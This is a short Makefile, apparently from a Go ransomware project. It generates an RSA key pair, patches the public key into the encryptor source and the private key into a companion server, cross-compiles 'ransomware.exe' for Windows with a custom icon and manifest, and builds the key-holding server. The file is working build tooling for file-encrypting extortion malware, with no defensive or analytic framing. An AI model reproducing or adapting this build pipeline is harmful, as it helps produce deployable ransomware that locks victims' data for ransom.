.PHONY: all

all: build clean

pre-build:
	openssl genrsa -out private.pem 2048
	openssl rsa -in private.pem -outform PEM -pubout -out public.pem
	rsrc -manifest ransomware.manifest -ico icon.ico -o ransomware.syso
	mkdir -p bin
	perl -pi.bak -e 's/INJECT_PUB_KEY_HERE/`echo -n "\n"; cat public.pem`/e' encrypt.go
	perl -pi.bak -e 's/INJECT_PRIV_KEY_HERE/`echo -n "\n"; cat private.pem`/e' server/main.go

build: pre-build
	env GOOS=windows go build && mv ransomware.exe bin
	cd server && go build && mv `ls|grep server` ../bin

simple-build:
	rsrc -manifest ransomware.manifest -ico icon.ico -o ransomware.syso
	mkdir -p bin
	env GOOS=windows go build && mv ransomware.exe bin
	cd server && go build && mv `ls|grep server` ../bin
	rm ransomware.syso

clean:
	rm private.pem public.pem
	rm ransomware.syso
	mv encrypt.go.bak encrypt.go
	mv server/main.go.bak server/main.go
